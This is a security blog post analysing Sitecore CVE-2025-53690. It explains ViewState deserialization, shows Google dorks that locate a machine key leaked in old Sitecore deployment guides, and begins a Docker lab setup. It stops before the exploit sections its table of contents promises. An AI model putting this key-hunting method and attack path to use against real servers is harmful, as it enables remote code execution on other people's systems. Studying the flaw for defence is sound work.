<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="CVE-2025-53690 Analysis & Weaponized POC"><title>Sitecore CVE-2025-53690 Detailed Analysis & Weaponized POC - Why you shouldnâ€™t blindly trust the documentation</title><link rel=canonical href=https://demo.stack.jimmycai.com/p/cve-2025-53690/><link rel=stylesheet href=/scss/style.min.b0e76e98cdd4f7082d1fc36f7af7e0843a81201db2197c03ca426751dc923735.css><meta property='og:title' content="Sitecore CVE-2025-53690 Detailed Analysis & Weaponized POC - Why you shouldnâ€™t blindly trust the documentation"><meta property='og:description' content="CVE-2025-53690 Analysis & Weaponized POC"><meta property='og:url' content='https://demo.stack.jimmycai.com/p/cve-2025-53690/'><meta property='og:site_name' content='Erik Learning Sec'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-10-30T00:00:00+00:00'><meta property='article:modified_time' content='2025-10-30T00:00:00+00:00'><meta property='og:image' content='https://demo.stack.jimmycai.com/p/cve-2025-53690/cover.jpg'><meta name=twitter:title content="Sitecore CVE-2025-53690 Detailed Analysis & Weaponized POC - Why you shouldnâ€™t blindly trust the documentation"><meta name=twitter:description content="CVE-2025-53690 Analysis & Weaponized POC"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://demo.stack.jimmycai.com/p/cve-2025-53690/cover.jpg'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_e653a35535d929f8.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ðŸ¤–</span></figure><div class=site-meta><h1 class=site-name><a href=/>Erik Learning Sec</a></h1><h2 class=site-description>Just a security enthusiast trying to learn more and more everyday.</h2></div></header><ol class=menu-social><li><a href=https://github.com/ErikLearningSec target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://www.linkedin.com/in/phamphuoc target=_blank title=Linkedin rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linkedin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 10-4 0"/><path d="M3 7a4 4 0 014-4h10a4 4 0 014 4v10a4 4 0 01-4 4H7a4 4 0 01-4-4z"/></svg></a></li><li><a href=https://x.com/ErikPham141 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-meeple"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 20H4a1 1 0 01-1-1c0-2 3.378-4.907 4-6-1 0-4-.5-4-2 0-2 4-3.5 6-4 0-1.5.5-4 3-4s3 2.5 3 4c2 .5 6 2 6 4 0 1.5-3 2-4 2 .622 1.093 4 4 4 6a1 1 0 01-1 1h-5c-1 0-2-4-3-4s-2 4-3 4z"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#brief-introduction-to-sitecore>Brief Introduction to Sitecore</a></li><li><a href=#a-little-backstory-d>A little Backstory :D</a></li><li><a href=#some-concepts-about-viewstate>Some concepts about VIEWSTATE</a><ol><li><a href=#why-viewstate-exists>Why VIEWSTATE exists</a></li><li><a href=#the-role-of-machine-key-in-viewstate>The role of Machine Key in VIEWSTATE</a></li><li><a href=#serialization-and-deserialization-process-for-viewstate>Serialization and deserialization process for VIEWSTATE</a></li><li><a href=#how-can-an-attacker-obtain-the-machine-key-common-cases>How can an attacker obtain the machine key? Common cases:</a></li></ol></li><li><a href=#analyzing-the-cve>Analyzing the CVE</a></li><li><a href=#setting-up-a-sitecore-instance>Setting up a Sitecore instance</a></li><li><a href=#reproducing-the-poc>Reproducing the POC</a></li><li><a href=#weaponize-the-poc>Weaponize the POC</a><ol><li><a href=#echo-technique>Echo technique</a></li><li><a href=#memshell>MemShell</a></li><li><a href=#overview-of-the-request-pipeline-in-aspnet>Overview of the Request Pipeline in ASP.NET</a></li><li><a href=#where-does-routing-appear-in-the-pipeline>Where Does Routing Appear in the Pipeline?</a></li><li><a href=#execution-flow-of-routing>Execution Flow of Routing:</a></li><li><a href=#honorable-mention>Honorable Mention</a></li><li><a href=#honorable-mention-2>Honorable Mention #2</a></li></ol></li><li><a href=#mitigation>Mitigation</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/cve-2025-53690/><img src=/p/cve-2025-53690/cover_hu_d66fb134c060be91.jpg srcset="/p/cve-2025-53690/cover_hu_d66fb134c060be91.jpg 800w, /p/cve-2025-53690/cover_hu_7aee490ef0fd80c.jpg 1600w" width=800 height=448 loading=lazy alt="Featured image of post Sitecore CVE-2025-53690 Detailed Analysis & Weaponized POC - Why you shouldnâ€™t blindly trust the documentation"></a></div><div class=article-details><header class=article-category><a href=/categories/cve-analysis/>CVE-Analysis</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/cve-2025-53690/>Sitecore CVE-2025-53690 Detailed Analysis & Weaponized POC - Why you shouldnâ€™t blindly trust the documentation</a></h2><h3 class=article-subtitle>CVE-2025-53690 Analysis & Weaponized POC</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-10-30T00:00:00Z>Oct 30, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>20 minute read</time></div></footer></div></header><section class=article-content><h2 id=brief-introduction-to-sitecore>Brief Introduction to Sitecore</h2><p>Sitecore is a Digital Experience Platform and a commerce-ready content management system designed for enterprise use. The solution combines content management, e-commerce, and marketing automation, allowing organizations to deliver personalized experiences across websites, mobile apps, and other channels. Typical Sitecore customers are medium to large businesses in industries such as retail, finance, healthcare, travel, education, and the public sector â€” organizations that require multiple sites, high availability, and deep integrations with internal systems. Because Sitecore often serves at the center of customer journeys and transactional processes, security vulnerabilities can have serious impacts on business operations and data privacy.</p><p><img src=/p/cve-2025-53690/image1.png width=1818 height=872 srcset="/p/cve-2025-53690/image1_hu_7b19956bf8dfcefa.png 480w, /p/cve-2025-53690/image1_hu_55f12399578693af.png 1024w" loading=lazy class=gallery-image data-flex-grow=208 data-flex-basis=500px></p><hr><h2 id=a-little-backstory-d>A little Backstory :D</h2><p>One fine day while scrolling Twitter for news and technical updates I ran into an alert about a critical Sitecore CVE with a CVSS score of 9.0. Naturally curious, I dove into analyzing this critical case :D</p><p><img src=/p/cve-2025-53690/image2.png width=1030 height=702 srcset="/p/cve-2025-53690/image2_hu_9eb453d5296262de.png 480w, /p/cve-2025-53690/image2_hu_1bda0dc6287986c1.png 1024w" loading=lazy class=gallery-image data-flex-grow=146 data-flex-basis=352px></p><p>This tweet references a Google/Mandiant blog that analyzed a recent campaign exploiting Sitecore instances using a sample machine key present in Sitecore&rsquo;s official deployment guides dating back to <strong>2017 and earlier</strong>.</p><p><img src=/p/cve-2025-53690/image3.png width=2256 height=1098 srcset="/p/cve-2025-53690/image3_hu_409331ab6eb77a9c.png 480w, /p/cve-2025-53690/image3_hu_c29aaaec55a37225.png 1024w" loading=lazy class=gallery-image data-flex-grow=205 data-flex-basis=493px></p><p>That analysis points to the root cause: leaked ASP.NET machine keys which allow an attacker to control the ViewState deserialization mechanism in ASP.NET applications and achieve RCE. First, we need to understand how this mechanism works.</p><hr><h2 id=some-concepts-about-viewstate>Some concepts about VIEWSTATE</h2><p><strong>VIEWSTATE</strong> is an ASP.NET mechanism used to persist the state of server controls across postbacks in a web application. Because HTTP is <strong>stateless</strong>, VIEWSTATE stores control state (e.g., TextBox values, CheckBox states, etc.) by serializing it to a binary blob, encoding it in Base64, and embedding it into the hidden <code>__VIEWSTATE</code> field in the HTML. This mechanism relies on the <strong>Machine Key</strong> for data protection and validation to ensure VIEWSTATE integrity and confidentiality.</p><p><img src=/p/cve-2025-53690/image4.png width=768 height=518 srcset="/p/cve-2025-53690/image4_hu_aca0dc49df664540.png 480w, /p/cve-2025-53690/image4_hu_998f60ceab48f8f3.png 1024w" loading=lazy class=gallery-image data-flex-grow=148 data-flex-basis=355px></p><h3 id=why-viewstate-exists>Why VIEWSTATE exists</h3><ul><li><strong>State persistence</strong>: VIEWSTATE preserves the state of UI controls across postbacks.</li><li><strong>Support for event-driven programming model</strong>: ASP.NET&rsquo;s event model expects controls to remember their previous state to handle events (e.g., button clicks).</li><li><strong>Server-side load reduction</strong>: By storing state on the client rather than server-side session storage, VIEWSTATE reduces server memory usage (suitable for apps that don&rsquo;t require complex server-side state).</li></ul><h3 id=the-role-of-machine-key-in-viewstate>The role of Machine Key in VIEWSTATE</h3><p><strong>Machine Key</strong> is a pair of secret keys (validationKey and decryptionKey) configured in <code>web.config</code> or the server to protect VIEWSTATE:</p><ul><li><strong>Validation (MAC)</strong>: Ensure VIEWSTATE hasn&rsquo;t been tampered with by generating a Message Authentication Code (MAC).</li><li><strong>Encryption</strong>: Optionally protect VIEWSTATE content from being read in plaintext.</li></ul><h3 id=serialization-and-deserialization-process-for-viewstate>Serialization and deserialization process for VIEWSTATE</h3><ol><li><strong>Serialization</strong>:<ul><li>The server collects control state (TextBox values, DropDownList selection, etc.).</li><li>The data is <strong>serialized</strong> into binary, optionally encrypted with the decryptionKey, and a MAC is created using the validationKey.</li><li>The resulting Base64 string is embedded into the hidden <code>__VIEWSTATE</code> input.</li></ul></li><li><strong>Deserialization</strong>:<ul><li>The client posts back the page including <code>__VIEWSTATE</code>.</li><li>The server verifies the MAC using the validationKey.</li><li>If valid, the server decrypts (if encrypted) using the decryptionKey and deserializes to restore control state.</li><li>This state is then used to handle events and render updates.</li></ul></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>[</span><span class=n>Client</span> <span class=p>(</span><span class=n>Browser</span><span class=p>)]</span>                       <span class=p>[</span><span class=n>Server</span> <span class=p>(</span><span class=n>ASP</span><span class=p>.</span><span class=n>NET</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span> <span class=mf>1</span><span class=p>.</span> <span class=n>Send</span> <span class=n>HTTP</span> <span class=n>request</span> <span class=p>(</span><span class=n>GET</span><span class=p>/</span><span class=n>POST</span><span class=p>)</span>       <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|--------------------------------------&gt;|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span> <span class=mf>2</span><span class=p>.</span> <span class=n>Server</span> <span class=n>handles</span> <span class=n>request</span><span class=p>,</span> <span class=n>builds</span> <span class=n>page</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Collect</span> <span class=n>control</span> <span class=n>states</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Serialize</span> <span class=n>states</span> <span class=n>to</span> <span class=n>blob</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Encrypt</span> <span class=n>blob</span> <span class=n>with</span> <span class=n>Machine</span> <span class=n>Key</span> <span class=p>(</span><span class=n>decryption</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Create</span> <span class=n>MAC</span> <span class=n>using</span> <span class=n>Machine</span> <span class=n>Key</span> <span class=p>(</span><span class=n>validation</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Embed</span> <span class=n>blob</span> <span class=n>into</span> <span class=n>__VIEWSTATE</span>
</span></span><span class=line><span class=cl>       <span class=p>|&lt;--------------------------------------|</span> <span class=mf>3</span><span class=p>.</span> <span class=k>Return</span> <span class=n>HTML</span> <span class=n>page</span> <span class=n>with</span> <span class=n>__VIEWSTATE</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span> <span class=mf>4</span><span class=p>.</span> <span class=n>User</span> <span class=n>interacts</span> <span class=p>(</span><span class=n>postback</span><span class=p>)</span>          <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>    <span class=p>-</span> <span class=n>Sends</span> <span class=n>__VIEWSTATE</span> <span class=n>back</span> <span class=n>with</span> <span class=n>form</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>       <span class=p>|--------------------------------------&gt;|</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span> <span class=mf>5</span><span class=p>.</span> <span class=n>Server</span> <span class=n>receives</span> <span class=n>request</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Verify</span> <span class=n>MAC</span> <span class=n>with</span> <span class=n>validation</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Decrypt</span> <span class=n>__VIEWSTATE</span> <span class=n>with</span> <span class=n>decryption</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Deserialize</span> <span class=n>to</span> <span class=n>restore</span> <span class=n>control</span> <span class=n>state</span>
</span></span><span class=line><span class=cl>       <span class=p>|</span>                                       <span class=p>|</span>    <span class=p>-</span> <span class=n>Handle</span> <span class=n>events</span> <span class=p>&amp;</span> <span class=n>update</span> <span class=n>page</span>
</span></span><span class=line><span class=cl>       <span class=p>|&lt;--------------------------------------|</span> <span class=mf>6</span><span class=p>.</span> <span class=n>Send</span> <span class=n>updated</span> <span class=n>HTML</span> <span class=n>with</span> <span class=n>new</span> <span class=n>__VIEWSTATE</span>
</span></span></code></pre></td></tr></table></div></div><p>From this mechanism we can infer that once an attacker obtains the machine key, they can craft a VIEWSTATE that forces the server to deserialize arbitrary objects. The attacker can then exploit deserialization gadget chains to run arbitrary code on the server.</p><hr><h3 id=how-can-an-attacker-obtain-the-machine-key-common-cases>How can an attacker obtain the machine key? Common cases:</h3><ul><li><p>The webapp has a file-disclosure vulnerability (File Inclusion, Path Traversal, <a class=link href=https://medium.com/@0xUN7H1NK4BLE/how-ssrf-leads-to-rce-in-a-net-application-ee1b13812245 target=_blank rel=noopener>SSRF</a>, etc.), allowing reading <code>web.config</code> from the webroot.</p></li><li><p>The attacker used another vulnerability to obtain RCE and then extracted the machine key to persist access. This technique has been observed in recent APT campaigns exploiting CVE-2025-49704 and CVE-2025-49706 (SharePoint ToolShell).</p><p><img src=/p/cve-2025-53690/image5.png width=939 height=632 srcset="/p/cve-2025-53690/image5_hu_ce0468f446030ffe.png 480w, /p/cve-2025-53690/image5_hu_d9e95bd5fa28f7f1.png 1024w" loading=lazy alt="Source: https://www.trellix.com/blogs/research/critical-sharepoint-vulnerabilities-under-active-exploitation/" class=gallery-image data-flex-grow=148 data-flex-basis=356px></p><p>This technique was discussed in detail by researcher <a class=link href=https://soroush.me/ target=_blank rel=noopener><strong>Soroush Dalili</strong></a>.</p><p><a class=link href=https://soroush.me/blog/danger-of-stealing-auto-generated-net-machine-keys target=_blank rel=noopener>https://soroush.me/blog/danger-of-stealing-auto-generated-net-machine-keys</a></p></li><li><p>Using machine keys leaked on the internet and cracking ViewState with public wordlists: <a class=link href=https://github.com/NotSoSecure/Blacklist3r target=_blank rel=noopener>https://github.com/NotSoSecure/Blacklist3r</a></p></li></ul><hr><h2 id=analyzing-the-cve>Analyzing the CVE</h2><p>For CVE-2025-53690, the attacker did not use the above typical methods; instead, they leveraged a Machine Key that was <strong>shared in old Sitecore deployment guides</strong>.</p><p><img src=/p/cve-2025-53690/image6.png width=885 height=419 srcset="/p/cve-2025-53690/image6_hu_41e1c2461e276715.png 480w, /p/cve-2025-53690/image6_hu_275269da105cf374.png 1024w" loading=lazy class=gallery-image data-flex-grow=211 data-flex-basis=506px></p><p>In Mandiant&rsquo;s analysis they didn&rsquo;t point out the machineKey being used in the campaign, but the blog does link to Sitecore&rsquo;s Security Bulletin here: <a class=link href="https://support.sitecore.com/kb?id=kb_article_view&amp;sysparm_article=KB1003865" target=_blank rel=noopener>https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1003865</a></p><p>In the Solution section, Sitecore provides some guidance to help customers mitigate the issue, but inadvertently gives us a hint: the machine key starts with <code>BDDFE367CDâ€¦</code> and the validation key starts with <code>0DAC68D020â€¦</code>.</p><p><img src=/p/cve-2025-53690/image7.png width=922 height=537 srcset="/p/cve-2025-53690/image7_hu_d3efd97e6215a78b.png 480w, /p/cve-2025-53690/image7_hu_6de1c6172972cf6c.png 1024w" loading=lazy class=gallery-image data-flex-grow=171 data-flex-basis=412px></p><p>From there we can start searching using Google dorking.</p><p>First, try searching <code>BDDFE367CD site:sitecore.com</code> to limit results to the sitecore domain.</p><p><img src=/p/cve-2025-53690/image8.png width=1211 height=305 srcset="/p/cve-2025-53690/image8_hu_4d90f3a5a805b9a5.png 480w, /p/cve-2025-53690/image8_hu_db19e7d3f105930.png 1024w" loading=lazy class=gallery-image data-flex-grow=397 data-flex-basis=952px></p><p>That search returned only the security bulletin we already referenced.</p><p><img src=/p/cve-2025-53690/image9.png width=1118 height=329 srcset="/p/cve-2025-53690/image9_hu_8dd1a6b8a0d82d14.png 480w, /p/cve-2025-53690/image9_hu_52041523dbc42a8a.png 1024w" loading=lazy class=gallery-image data-flex-grow=339 data-flex-basis=815px></p><p>Similarly, <code>0DAC68D020 site:sitecore.com</code> returned no additional results.</p><p>Using our knowledge that the MachineKey is usually configured in <code>web.config</code>, which looks like:</p><p><img src=/p/cve-2025-53690/image10.png width=706 height=210 srcset="/p/cve-2025-53690/image10_hu_2330516b5f1d7089.png 480w, /p/cve-2025-53690/image10_hu_d093e3bdf214c575.png 1024w" loading=lazy class=gallery-image data-flex-grow=336 data-flex-basis=806px></p><p>We changed the dork to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;&lt;machineKey&#34;</span> site:sitecore.com
</span></span></code></pre></td></tr></table></div></div><p>This produced more hits and after scrolling we found the document referenced in the security bulletin.</p><p><img src=/p/cve-2025-53690/image11.png width=1321 height=675 srcset="/p/cve-2025-53690/image11_hu_5044d294bc2c1f27.png 480w, /p/cve-2025-53690/image11_hu_73234d5d9fa8de4d.png 1024w" loading=lazy class=gallery-image data-flex-grow=195 data-flex-basis=469px></p><p>We can see the machineKey and validation key here match the hints from the security bulletin (machine key starting with <code>BDDFE367CDâ€¦</code> and validation key starting with <code>0DAC68D020â€¦</code>).</p><p><img src=/p/cve-2025-53690/image12.png width=652 height=132 srcset="/p/cve-2025-53690/image12_hu_4161672b3ad3f831.png 480w, /p/cve-2025-53690/image12_hu_9856f429f8fdee2e.png 1024w" loading=lazy class=gallery-image data-flex-grow=493 data-flex-basis=1185px></p><p>If this is only a sample key, why did it become a serious CVE scoring CVSS 9.0?</p><p>Reading the guidance carefully, the language here is problematic:</p><p><img src=/p/cve-2025-53690/image13.png width=678 height=298 srcset="/p/cve-2025-53690/image13_hu_7049f174469aeb1e.png 480w, /p/cve-2025-53690/image13_hu_ba5b6529ea631b90.png 1024w" loading=lazy class=gallery-image data-flex-grow=227 data-flex-basis=546px></p><p>The document says:</p><blockquote><p>ðŸ˜…
You can either paste this key into your web.config file or generate another unique key at:</p><ul><li><a class=link href=http://www.orcsweb.com/articles/aspnetmachinekey.aspx target=_blank rel=noopener>http://www.orcsweb.com/articles/aspnetmachinekey.aspx</a></li></ul></blockquote><p>The first clause explicitly suggests that developers could take this sample key and paste it directly into their <code>web.config</code> without generating a new unique key. It&rsquo;s easy to guess that quite a few developers followed that suggestion, which led to the vulnerability.</p><p>Evidence shows that searching this machineKey on Google finds many sources referring to its use. Worse, it appears the key has been included in public wordlists on GitHub for years.</p><p><img src=/p/cve-2025-53690/image14.png width=1058 height=937 srcset="/p/cve-2025-53690/image14_hu_98563f340f882cca.png 480w, /p/cve-2025-53690/image14_hu_7987f489d24f0a14.png 1024w" loading=lazy class=gallery-image data-flex-grow=112 data-flex-basis=270px></p><hr><h2 id=setting-up-a-sitecore-instance>Setting up a Sitecore instance</h2><p>After obtaining the machineKey, we set up a lab to reproduce the POC.</p><p>First, create a Sitecore Docker environment. Refer to: <a class=link href="https://www.youtube.com/watch?v=a-hjq7WcZiY" target=_blank rel=noopener>https://www.youtube.com/watch?v=a-hjq7WcZiY</a></p><p>After installing Docker Desktop, right-click the Docker icon in the tray and choose &ldquo;Switch to Windows containersâ€¦&rdquo;</p><p><img src=/p/cve-2025-53690/image15.png width=529 height=764 srcset="/p/cve-2025-53690/image15_hu_3b140156bf712e70.png 480w, /p/cve-2025-53690/image15_hu_a1d441dba04e18a7.png 1024w" loading=lazy class=gallery-image data-flex-grow=69 data-flex-basis=166px></p><p>Clone the repo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>git</span> <span class=n>clone</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>github</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>Sitecore</span><span class=p>/</span><span class=nb>container-deployment</span><span class=p>.</span><span class=py>git</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/cve-2025-53690/image16.png width=1439 height=264 srcset="/p/cve-2025-53690/image16_hu_6883254b526922ec.png 480w, /p/cve-2025-53690/image16_hu_c7b304c9af5ffd21.png 1024w" loading=lazy class=gallery-image data-flex-grow=545 data-flex-basis=1308px></p><p>Navigate to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>container-deployment<span class=se>\c</span>ompose<span class=se>\s</span>xp<span class=se>\1</span>0.4<span class=se>\l</span>tsc2022<span class=se>\x</span>p0
</span></span></code></pre></td></tr></table></div></div><p>Open PowerShell as Administrator and run <code>compose-init.ps1</code> to initialize the Sitecore environment. Provide the path to your <code>license.xml</code>.</p><p><img src=/p/cve-2025-53690/image17.png width=727 height=105 srcset="/p/cve-2025-53690/image17_hu_b3d7fbc9a491407.png 480w, /p/cve-2025-53690/image17_hu_cb15fac5ab00580c.png 1024w" loading=lazy class=gallery-image data-flex-grow=692 data-flex-basis=1661px></p><p>Then run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker compose up -d
